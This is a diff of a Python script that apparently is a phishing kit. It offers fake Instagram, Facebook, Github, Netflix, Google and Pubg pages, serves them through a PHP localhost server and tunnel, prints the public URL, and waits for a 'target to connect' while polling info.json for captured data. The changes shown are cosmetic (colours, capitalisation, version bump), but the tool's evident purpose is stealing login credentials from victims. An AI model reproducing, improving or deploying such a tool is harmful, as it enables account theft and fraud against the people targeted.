@@ -12,12 +12,12 @@ try:
     import pandas as pd
     import keyboard
 except ImportError:
-    install = input(f"{Fore.RED}unfortunately you dont have excepetd modules!!\n{Fore.GREEN}Want to install ? (y/n) :")
+    install = input(f"{Fore.RED}unfortunately you dont have excepetd modules !!\n{Fore.GREEN}Want to install ? (y/n) :")
     if install.lower == "y" or install.upper == "y":
         os.system("pip install colorama , playsound , pandas , keyboard , pywin32")
         sleep(0.5)
     else:
-        exit(Fore.GREEN + "have a good day".title()) 
+        exit(Fore.GREEN + "have a good day".title())
 #build localhost====================================================================================================
 def php_server():
     with open("server" , "w") as log:
@@ -47,21 +47,13 @@ if check != 0:
 else:
     try:
         os.system("cls")
-    except:
+    except Exception:
         os.system("clear")
         pass
     sleep(0.2)
     pass
 
 #Banner ====================================================================================================
-# path = os.getcwd()
-# r = open(rf"{path}\rabbit\rb.txt" , "r")
-
-# print(Fore.RED + r.read() + Fore.RESET)
-
-# os.system("cd ..")
-
-
 Banner_color = Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN
 
 
@@ -76,7 +68,7 @@ print(fr"""{random.choice(Banner_color)}
 `.   ` ..' /  |  |   |  ||  |`.   \  .'    /                |     |        |    || |  .'''-. |  |     _| | .'''-. |                  || |  | | 
     '-...-'`   |  |   |  ||  |  `.  `'    .'                 |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \\    .-------------'| |  | | 
             |  |   |  ||  |    '.    .'                   |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | | \    '-.____...---.| |  '-  
-            |  |   |  ||__|    .'     `.   version : 1.0  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |  `.             .' | |      
+            |  |   |  ||__|    .'     `.   version : 1.1  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |  `.             .' | |      
             |  |   |  |      .'  .'`.   `.               .'     '.             | |     | |  .'.'.-'  / | |     | |    `''-...... -'   | |      
             |  |   |  |    .'   /    `.   `.           '-----------'           | '.    | '. .'   \_.'  | '.    | '.                   |_|      
             '--'   '--'   '----'       '----'                                  '---'   '---'           '---'   '---'                           
@@ -87,7 +79,7 @@ print(fr"""{random.choice(Banner_color)}
 #choices====================================================================================================
 print(f""" 
 
-{Fore.RED}[1]{Fore.LIGHTWHITE_EX} instagram    {Fore.RED}[2]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[3]{Fore.LIGHTWHITE_EX} Github  
+{Fore.RED}[1]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[2]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[3]{Fore.LIGHTWHITE_EX} Github  
 
 {Fore.RED}[4]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[5]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[6]{Fore.LIGHTWHITE_EX} Pubg
 
@@ -97,7 +89,7 @@ print(f"""
 
 
 try:
-    ask = input(Fore.MAGENTA + "which option you want: " + Fore.RESET)
+    ask = input(Fore.MAGENTA + "which option you want: ".title() + Fore.RESET)
 except KeyboardInterrupt:
     exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
@@ -116,7 +108,7 @@ def instagram():
 
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):".title() + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
@@ -131,10 +123,10 @@ def instagram():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.RESET}" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
-        
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+
 #Write info====================================================================================================
     while True:
         size = os.stat("info.json")
@@ -238,9 +230,9 @@ def facebook():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
+    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -348,9 +340,9 @@ def netflix():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
+    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -455,9 +447,9 @@ def Google():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
+    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -563,10 +555,10 @@ def Github():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
-        
+    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+
 #Write info====================================================================================================
     while True:
         size = os.stat("info.json")
@@ -671,9 +663,9 @@ def Pubg():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print("\nyour url :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
 
-    print(Fore.GREEN + "\nif you didnt get the url get out the localhost.txt file !" + Fore.RESET)
+    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
     while True:
